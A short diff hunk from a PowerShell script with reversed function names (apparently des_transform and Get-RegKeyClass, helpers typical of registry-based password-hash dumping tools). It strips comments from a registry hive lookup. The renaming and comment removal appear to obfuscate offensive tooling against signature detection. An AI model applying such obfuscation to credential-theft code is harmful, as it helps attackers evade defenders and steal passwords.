@@ -328,11 +328,11 @@ function mrofsnart_sed([byte[]]$data, [byte[]]$key, $doEncrypt) {
 }
 function ssalCyeKgeR-teG([string]$key, [string]$subkey) {
     switch ($key) {
-        "HKCR" { $nKey = 0x80000000 } # HK Classes Root
-        "HKCU" { $nKey = 0x80000001 } # HK Current User
-        "HKLM" { $nKey = 0x80000002 } # HK Local Machine
-        "HKU"  { $nKey = 0x80000003 } # HK Users
-        "HKCC" { $nKey = 0x80000005 } # HK Current Config
+        "HKCR" { $nKey = 0x80000000 }
+        "HKCU" { $nKey = 0x80000001 }
+        "HKLM" { $nKey = 0x80000002 }
+        "HKU"  { $nKey = 0x80000003 }
+        "HKCC" { $nKey = 0x80000005 }
         default {
             throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
         }
